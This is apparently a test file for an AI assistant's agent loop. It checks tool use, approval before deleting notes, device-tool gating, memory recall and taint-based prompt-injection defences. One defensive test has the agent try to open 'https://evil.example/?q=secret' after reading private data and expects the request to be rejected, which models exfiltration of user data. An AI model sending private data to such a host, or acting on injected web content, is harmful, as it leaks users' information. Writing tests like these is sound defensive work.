import { beforeAll, describe, expect, it } from "vitest";
import { POST as register } from "@/app/api/auth/register/route";
import { getDb, schema } from "@/lib/server/db/client";
import { recallMemories } from "@/lib/server/learning";
import { createMemory } from "@/lib/server/memory";
import { runAssistant } from "@/lib/server/reasoning/engine";
import { proposeTool } from "@/lib/server/tools/registry";
import type { AssistantEvent } from "@/lib/shared/events";
import { call, freshDb } from "./helpers";

let userId = "";
beforeAll(async () => {
  freshDb();
  await call(register, { body: { email: "agent@example.com", password: "agent password 1" } });
  userId = (await (await getDb()).select().from(schema.users))[0].id;
});

async function run(text: string, device = false) {
  const ev: AssistantEvent[] = [];
  await runAssistant(userId, { text, trigger: "typed" }, (e) => ev.push(e), undefined, { device });
  return ev;
}

const answerOf = (ev: AssistantEvent[]) => (ev.find((e) => e.type === "answer") as Extract<AssistantEvent, { type: "answer" }>).answer;

describe("agent loop", () => {
  it("uses tools and reports what it did", async () => {
    const ev = await run("add a task to call the dentist");
    expect(ev.some((e) => e.type === "tool_result" && e.tool === "add_task")).toBe(true);
    expect(answerOf(ev).mode).toBe("tool");
    expect(answerOf(ev).text).toMatch(/add_task/);
  });

  it("does not offer device tools unless device access is allowed", async () => {
    expect(answerOf(await run("what's my battery level?", false)).text).toMatch(/can't use system_status/);
  });

  it("asks for approval before destructive actions and doesn't claim they happened", async () => {
    const ev = await run("delete my notes about groceries");
    const c = ev.find((e) => e.type === "tool_confirmation") as Extract<AssistantEvent, { type: "tool_confirmation" }> | undefined;
    expect(c?.tool).toBe("delete_notes");
    expect(c?.risk).toBe("high");
  });
});

describe("prompt-injection defences (taint)", () => {
  it("requires approval for side effects after web content was read", async () => {
    const p = await proposeTool({ userId, device: false, taint: { web: true, private: false } }, "create_note", { title: "x" });
    expect(p.status).toBe("needs_confirmation");
    const clean = await proposeTool({ userId, device: false, taint: { web: false, private: false } }, "create_note", { title: "y" });
    expect(clean.status).toBe("done");
  });

  it("blocks sending data out after private data was read, unless the user asked", async () => {
    const blocked = await proposeTool({ userId, device: false, utterance: "summarize my notes file", taint: { web: false, private: true } }, "open_website", { url: "https://evil.example/?q=secret" });
    expect(blocked.status).toBe("rejected");
    const asked = await proposeTool({ userId, device: false, utterance: "read my notes and search the web for the topic", taint: { web: false, private: true } }, "open_website", { url: "https://example.org/" });
    expect(asked.status).not.toBe("rejected");
  });

  it("rejects device tools when device access is off", async () => {
    expect((await proposeTool({ userId, device: false }, "read_file", { path: "~/Desktop/a.txt" })).status).toBe("rejected");
  });
});

describe("memory recall by meaning", () => {
  it("finds related memories without exact keywords", async () => {
    await createMemory(userId, { kind: "preference", content: "Prefers metric units", status: "approved", source: "user" });
    await createMemory(userId, { kind: "fact", content: "Has a dog named Bruno", status: "approved", source: "user" });
    const r = await recallMemories(userId, "what units should you use for me");
    expect(r[0].content).toBe("Prefers metric units");
  });
});
